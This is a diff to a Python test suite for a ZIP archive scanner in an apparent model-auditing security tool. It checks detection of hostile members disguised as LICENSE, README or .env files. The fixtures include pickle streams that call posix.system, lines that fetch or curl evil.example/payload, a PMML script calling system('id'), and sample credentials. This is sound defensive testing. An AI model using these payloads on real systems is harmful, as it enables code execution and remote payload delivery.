@@ -8552,7 +8552,8 @@ class TestZipScanner:
             entry["path"] == f"{archive_path}:model.onnx" and entry["type"] == "onnx"
             for entry in result.metadata["contents"]
         )
-        assert any(check.name == "ONNX Library Check" for check in result.checks)
+        assert any(check.name == "ONNX Capability Check" for check in result.checks)
+        assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
         assert not any(check.name == "ONNX Candidate Analysis" for check in result.checks)
 
     def test_nested_member_does_not_route_prefixed_generic_protobuf_as_onnx(self, tmp_path: Path) -> None:
@@ -9047,6 +9048,57 @@ class TestZipScanner:
         assert local_header >= 0
         archive_bytes[local_header + 18 : local_header + 26] = b"\x00" * 8
         archive_path.write_bytes(archive_bytes)
+
+        result = ZipScanner().scan(str(archive_path))
+
+        assert result.success is True
+        assert not any(
+            check.name == "ZIP Central Directory Preflight" and check.status == CheckStatus.FAILED
+            for check in result.checks
+        )
+
+    def test_partial_zip64_streamed_entry_uses_64bit_descriptor_width(self, tmp_path: Path) -> None:
+        class NonSeekableBuffer(io.BytesIO):
+            def seek(self, *_args: Any, **_kwargs: Any) -> int:
+                raise io.UnsupportedOperation("not seekable")
+
+            def seekable(self) -> bool:
+                return False
+
+        archive_buffer = NonSeekableBuffer()
+        with (
+            zipfile.ZipFile(archive_buffer, "w") as archive,
+            archive.open("archive/data/0", "w", force_zip64=True) as member,
+        ):
+            member.write(b"safe")
+
+        archive_bytes = bytearray(archive_buffer.getvalue())
+        local_header = archive_bytes.find(b"PK\x03\x04")
+        assert local_header >= 0
+        filename_size = int.from_bytes(archive_bytes[local_header + 26 : local_header + 28], "little")
+        extra_size = int.from_bytes(archive_bytes[local_header + 28 : local_header + 30], "little")
+        extra_start = local_header + 30 + filename_size
+        assert archive_bytes[extra_start : extra_start + 2] == b"\x01\x00"
+        assert int.from_bytes(archive_bytes[extra_start + 2 : extra_start + 4], "little") == 16
+
+        del archive_bytes[extra_start + 12 : extra_start + 20]
+        archive_bytes[extra_start + 2 : extra_start + 4] = (8).to_bytes(2, "little")
+        archive_bytes[local_header + 18 : local_header + 26] = b"\x00" * 8
+        archive_bytes[local_header + 28 : local_header + 30] = (extra_size - 8).to_bytes(2, "little")
+
+        eocd_index = archive_bytes.rfind(b"PK\x05\x06")
+        assert eocd_index >= 0
+        directory_offset = int.from_bytes(archive_bytes[eocd_index + 16 : eocd_index + 20], "little")
+        archive_bytes[eocd_index + 16 : eocd_index + 20] = (directory_offset - 8).to_bytes(4, "little")
+
+        archive_path = tmp_path / "partial-zip64-streamed.zip"
+        archive_path.write_bytes(archive_bytes)
+
+        assert not ZipScanner.requires_preflight_result(
+            str(archive_path),
+            ZipScanner.DEFAULT_MAX_ENTRIES,
+            ZipScanner.central_directory_size_limit({}),
+        )
 
         result = ZipScanner().scan(str(archive_path))
 
@@ -10468,7 +10520,7 @@ class TestZipScanner:
 
         for audit_result in (first_result, second_result):
             metadata = audit_result.file_metadata[str(archive_path)]
-            assert audit_result.success is True
+            assert audit_result.success is False
             assert audit_result.has_errors is False
             assert core.determine_exit_code(audit_result) == 1
             assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
@@ -10822,11 +10874,16 @@ class TestZipScanner:
         )
         assert not any(issue.rule_code in {"S901", "S902"} for issue in result.issues)
 
-    def test_scan_zip_uses_logical_legal_member_name_for_network_classification(self, tmp_path: Path) -> None:
+    @pytest.mark.parametrize("member_name", ["LICENSE", "LICENSE.markdown", "NOTICE.markdown"])
+    def test_scan_zip_uses_logical_legal_member_name_for_network_classification(
+        self,
+        tmp_path: Path,
+        member_name: str,
+    ) -> None:
         archive_path = tmp_path / "legal_text_member_with_url.zip"
         with zipfile.ZipFile(archive_path, "w") as z:
             z.writestr(
-                "LICENSE",
+                member_name,
                 "MIT License\n\n"
                 "Copyright (c) 2026 Example\n"
                 "Permission is hereby granted.\n"
@@ -10839,20 +10896,275 @@ class TestZipScanner:
         license_network_issues = [
             issue
             for issue in result.issues
-            if issue.rule_code == "S309" and issue.details.get("zip_entry") == "LICENSE"
+            if issue.rule_code == "S309" and issue.details.get("zip_entry") == member_name
         ]
         assert license_network_issues
         assert all(issue.severity == IssueSeverity.INFO for issue in license_network_issues)
 
-    def test_scan_zip_keeps_malicious_pickle_named_license_on_pickle_route(self, tmp_path: Path) -> None:
-        archive_path = tmp_path / "malicious_license_member.zip"
-        with zipfile.ZipFile(archive_path, "w") as z:
-            z.writestr("LICENSE", b'cposix\nsystem\n(S"echo pwned"\ntR.')
+    @pytest.mark.parametrize(
+        ("member_name", "content", "expected_rule"),
+        [
+            ("LICENSE.md", 'requests.get("https://evil.example/payload")\n', "S302"),
+            ("LICENSE.txt", "Authorization: Basic dXNlcjpwYXNz\n", "S702"),
+            (
+                "LICENSE.rst",
+                'import subprocess\nsubprocess.run(["curl", "https://evil.example/payload"])\n',
+                "S309",
+            ),
+        ],
+    )
+    def test_scan_zip_preserves_main_owned_license_extensions_without_legal_keywords(
+        self,
+        tmp_path: Path,
+        member_name: str,
+        content: str,
+        expected_rule: str,
+    ) -> None:
+        archive_path = tmp_path / "main_owned_license_extensions.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(member_name, content)
 
         result = self.scanner.scan(str(archive_path))
 
         assert result.success is False
-        assert any(issue.rule_code == "S201" and issue.details.get("zip_entry") == "LICENSE" for issue in result.issues)
+        assert any(
+            check.rule_code == expected_rule and check.details.get("zip_entry") == member_name
+            for check in result.checks
+        )
+
+    @pytest.mark.parametrize("member_name", ["LICENSE.env", "NOTICE.env"])
+    def test_scan_zip_routes_legal_stem_env_members_as_env_and_detects_aws_credentials(
+        self,
+        tmp_path: Path,
+        member_name: str,
+    ) -> None:
+        archive_path = tmp_path / "legal_stem_env.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(member_name, "AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP\n")
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            check.rule_code == "S704" and check.details.get("zip_entry") == member_name for check in result.checks
+        )
+        assert not any(
+            check.details.get("file_type") in {"license", "notice"} and check.details.get("zip_entry") == member_name
+            for check in result.checks
+        )
+
+    def test_scan_zip_numpy_license_basic_permissions_does_not_report_basic_auth(self, tmp_path: Path) -> None:
+        archive_path = tmp_path / "numpy_license.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(
+                "LICENSE.txt",
+                "NumPy license information\n"
+                "GNU GENERAL PUBLIC LICENSE Version 3\n"
+                "Copyright 2026 NumPy Developers\n"
+                "2. Basic Permissions.\n"
+                "Permission is granted to use and redistribute this software.\n",
+            )
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is True
+        assert not any(check.rule_code == "S702" for check in result.checks)
+
+    def test_scan_zip_legal_member_keeps_real_basic_auth_detection(self, tmp_path: Path) -> None:
+        archive_path = tmp_path / "license_with_credentials.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(
+                "LICENSE.txt",
+                "MIT License\nCopyright Example\nAuthorization: Basic dXNlcjpwYXNz\n",
+            )
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            check.rule_code == "S702"
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+            and check.details.get("zip_entry") == "LICENSE.txt"
+            for check in result.checks
+        )
+
+    @pytest.mark.parametrize(
+        ("payload", "expected_issue"),
+        [
+            (
+                b'<?xml version="1.0"?><PMML version="4.4"><Header><Extension>'
+                b"<script>system('id')</script></Extension></Header><Copyright>MIT License</Copyright></PMML>",
+                "suspicious",
+            ),
+            (
+                b'<?xml version="1.0"?><net version="10"><layers>'
+                b'<layer id="1" name="evil" type="Python" library="evil.so"/>'
+                b"</layers><copyright>MIT License</copyright></net>",
+                "python layer",
+            ),
+        ],
+    )
+    def test_scan_zip_routes_structured_xml_license_member_before_text(
+        self,
+        tmp_path: Path,
+        payload: bytes,
+        expected_issue: str,
+    ) -> None:
+        archive_path = tmp_path / "structured_license_member.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("LICENSE", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert any(expected_issue in issue.message.lower() for issue in result.issues)
+        assert not any(
+            check.name == "File Type Identification"
+            and check.details.get("file_type") == "license"
+            and check.details.get("zip_entry") == "LICENSE"
+            for check in result.checks
+        )
+
+    @pytest.mark.parametrize(
+        ("payload", "expected_outcome"),
+        [
+            (b"S'MIT License'\n.Pdangerous\n", "inconclusive"),
+            (b"cposix\nsystem\n0MIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\n2MIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\nPid\nMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\naMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\nsMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\ntMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\nlMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\ndMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\np0\nMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\ng0\nMIT License\nCopyright Example\n", "security_finding"),
+            (b"cposix\nsystem\nbMIT License\nCopyright Example\n", "security_finding"),
+        ],
+    )
+    def test_scan_zip_fails_closed_for_suspicious_legal_pickle_continuation(
+        self,
+        tmp_path: Path,
+        payload: bytes,
+        expected_outcome: str,
+    ) -> None:
+        archive_path = tmp_path / "legal_pickle_continuation.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("LICENSE", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        if expected_outcome == "inconclusive":
+            assert any(
+                check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE"
+                for check in result.checks
+            )
+        else:
+            assert any(
+                issue.rule_code == "S201" and issue.details.get("zip_entry") == "LICENSE" for issue in result.issues
+            )
+
+    @pytest.mark.parametrize(
+        "pickle_stream",
+        [
+            pytest.param(b"]cposix\nsystem\na.", id="EMPTY_LIST-APPEND"),
+            pytest.param(b"(cposix\nsystem\nt.", id="MARK-TUPLE"),
+            pytest.param(b"(S'key'\ncposix\nsystem\nd.", id="MARK-STRING-DICT"),
+        ],
+    )
+    def test_scan_zip_fails_closed_for_embedded_global_with_pre_global_stack_context(
+        self,
+        tmp_path: Path,
+        pickle_stream: bytes,
+    ) -> None:
+        archive_path = tmp_path / "embedded_pre_global_stack.zip"
+        payload = b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n" + pickle_stream
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("LICENSE", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
+        )
+
+    @pytest.mark.parametrize(
+        "padding_size",
+        [
+            file_detection.PROTO0_1_MAX_PROBE_BYTES - 2,
+            file_detection.PROTO0_1_MAX_PROBE_BYTES - 1,
+            file_detection.PROTO0_1_MAX_PROBE_BYTES,
+            file_detection.PROTO0_1_MAX_PROBE_BYTES + 1,
+        ],
+    )
+    def test_scan_zip_fails_closed_for_embedded_global_at_lookbehind_boundary(
+        self,
+        tmp_path: Path,
+        padding_size: int,
+    ) -> None:
+        archive_path = tmp_path / "embedded_lookbehind_boundary.zip"
+        payload = (
+            b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n"
+            + b"]"
+            + (b"2" * padding_size)
+            + b"cposix\nsystem\na."
+        )
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("LICENSE", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
+        )
+
+    @pytest.mark.parametrize(
+        "operand_size",
+        [
+            file_detection.PROTO0_1_MAX_PROBE_BYTES,
+            file_detection.PROTO0_1_MAX_PROBE_BYTES + 1,
+            file_detection.PROTO0_1_MAX_PROBE_BYTES + 128,
+        ],
+    )
+    def test_scan_zip_recovers_protocol0_line_operand_boundary_before_embedded_global(
+        self,
+        tmp_path: Path,
+        operand_size: int,
+    ) -> None:
+        archive_path = tmp_path / "embedded_line_operand_boundary.zip"
+        payload = (
+            b"MIT License\nCopyright Example\nThe documentation contains a serialized example:\n]S'"
+            + (b"A" * operand_size)
+            + b"'\n0cposix\nsystem\na."
+        )
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("LICENSE", payload)
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            check.name == "Pickle Routing" and check.details.get("zip_entry") == "LICENSE" for check in result.checks
+        )
+
+    @pytest.mark.parametrize("member_name", ["LICENSE", "LICENSE.txt"])
+    def test_scan_zip_keeps_malicious_pickle_named_license_on_pickle_route(
+        self,
+        tmp_path: Path,
+        member_name: str,
+    ) -> None:
+        archive_path = tmp_path / "malicious_license_member.zip"
+        with zipfile.ZipFile(archive_path, "w") as z:
+            z.writestr(member_name, b'cposix\nsystem\n(S"echo pwned"\ntR.')
+
+        result = self.scanner.scan(str(archive_path))
+
+        assert result.success is False
+        assert any(
+            issue.rule_code == "S201" and issue.details.get("zip_entry") == member_name for issue in result.issues
+        )
 
     def test_scan_zip_keeps_webbrowser_pickle_named_notice_on_pickle_route(self, tmp_path: Path) -> None:
         archive_path = tmp_path / "webbrowser_notice_member.zip"
@@ -10975,6 +11287,187 @@ class TestZipScanner:
         assert not noisy_pickle_warnings, (
             f"Expected no noisy pickle warning for plain text, got: {[i.message for i in noisy_pickle_warnings]}"
         )
+
+    def test_scan_zip_audio_tokenizer_readme_basic_links_not_basic_auth_secret(self, tmp_path: Path) -> None:
+        archive_path = tmp_path / "model_card.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("audio_tokenizer/README.md", "Provide the basic links for the model\n")
+
+        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
+            from modelaudit.scanners.text_scanner import TextScanner
+
+            return TextScanner(config={"check_network_comm": False, "cache_enabled": False}).scan(path)
+
+        result = ZipScanner(
+            config={
+                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
+                ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["audio_tokenizer/README.md"],
+            }
+        ).scan(str(archive_path))
+
+        assert result.success is True
+        assert not [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert any(
+            check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.PASSED
+            and check.details.get("zip_entry") == "audio_tokenizer/README.md"
+            for check in result.checks
+        )
+
+    def test_scan_zip_text_member_detects_valid_basic_auth_header(self, tmp_path: Path) -> None:
+        archive_path = tmp_path / "headers.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("README.md", "Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==\n")
+
+        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
+            from modelaudit.scanners.text_scanner import TextScanner
+
+            return TextScanner(config={"check_network_comm": False, "cache_enabled": False}).scan(path)
+
+        result = ZipScanner(
+            config={
+                NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan,
+                ZIP_CONTENT_ONLY_MEMBER_ENTRIES_CONFIG_KEY: ["README.md"],
+            }
+        ).scan(str(archive_path))
+
+        failed_secret_checks = [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert result.success is False
+        assert failed_secret_checks
+        assert failed_secret_checks[0].rule_code == "S702"
+        assert failed_secret_checks[0].details.get("zip_entry") == "README.md"
+
+    def test_scan_zip_backslash_readme_member_detects_basic_auth_header(self, tmp_path: Path) -> None:
+        archive_path = tmp_path / "backslash_headers.zip"
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr("docs\\README", "Authorization: Basic YmFja3NsYXNoOnBhc3M=\n")
+
+        result = core.scan_file(
+            str(archive_path),
+            config={
+                "cache_scan_results": False,
+                "check_network_comm": False,
+            },
+        )
+
+        failed_secret_checks = [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert result.success is False
+        assert failed_secret_checks
+        assert failed_secret_checks[0].rule_code == "S702"
+        zip_entry = failed_secret_checks[0].details.get("zip_entry")
+        assert isinstance(zip_entry, str)
+        assert zip_entry.replace("\\", "/") == "docs/README"
+
+    def test_scan_zip_long_preserved_readme_member_cleans_tempdir(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        archive_path = tmp_path / "long_readme.zip"
+        temp_root = tmp_path / "temp-root"
+        temp_root.mkdir()
+        monkeypatch.setattr(tempfile, "tempdir", str(temp_root))
+        long_readme_name = "readme." + ("a" * 300) + ".md"
+
+        with zipfile.ZipFile(archive_path, "w") as archive:
+            archive.writestr(long_readme_name, "Authorization: Basic bG9uZy1yZWFkbWU6cGFzcw==\n")
+
+        result = core.scan_file(
+            str(archive_path),
+            config={
+                "cache_scan_results": False,
+                "check_network_comm": False,
+            },
+        )
+
+        failed_secret_checks = [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert result.success is False
+        assert failed_secret_checks
+        assert failed_secret_checks[0].rule_code == "S702"
+        assert failed_secret_checks[0].details.get("zip_entry") == long_readme_name
+        assert list(temp_root.iterdir()) == []
+
+    def test_scan_nested_zip_text_member_detects_valid_basic_auth_header(self, tmp_path: Path) -> None:
+        inner_payload = io.BytesIO()
+        with zipfile.ZipFile(inner_payload, "w") as inner_archive:
+            inner_archive.writestr("README.md", "Authorization: Basic dXNlcjpwYXNz\n")
+
+        archive_path = tmp_path / "nested_headers.zip"
+        with zipfile.ZipFile(archive_path, "w") as outer_archive:
+            outer_archive.writestr("nested/inner.zip", inner_payload.getvalue())
+
+        result = core.scan_file(
+            str(archive_path),
+            config={
+                "cache_scan_results": False,
+                "check_network_comm": False,
+            },
+        )
+
+        failed_secret_checks = [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert result.success is False
+        assert failed_secret_checks
+        assert failed_secret_checks[0].rule_code == "S702"
+        assert failed_secret_checks[0].details.get("zip_entry") == "nested/inner.zip:README.md"
+
+    def test_scan_nested_zip_env_member_detects_basic_auth_server_header(self, tmp_path: Path) -> None:
+        inner_payload = io.BytesIO()
+        with zipfile.ZipFile(inner_payload, "w") as inner_archive:
+            inner_archive.writestr(".env", "HTTP_AUTHORIZATION=Basic bmVzdGVkLWVudjpwYXNz\n")
+
+        archive_path = tmp_path / "nested_env.zip"
+        with zipfile.ZipFile(archive_path, "w") as outer_archive:
+            outer_archive.writestr("nested/inner.zip", inner_payload.getvalue())
+
+        result = core.scan_file(
+            str(archive_path),
+            config={
+                "cache_scan_results": False,
+                "check_network_comm": False,
+            },
+        )
+
+        failed_secret_checks = [
+            check
+            for check in result.checks
+            if check.name == "Embedded Secrets Detection"
+            and check.status == CheckStatus.FAILED
+            and check.details.get("secret_type") == "Basic Auth Credentials"
+        ]
+        assert result.success is False
+        assert failed_secret_checks
+        assert failed_secret_checks[0].rule_code == "S702"
+        assert failed_secret_checks[0].details.get("zip_entry") == "nested/inner.zip:.env"
 
     def test_scan_zip_with_proto0_pickle_with_single_comment_token_bypass_regression(self, tmp_path: Path) -> None:
         """Single comment-token prefix must not suppress proto0 payload detection."""
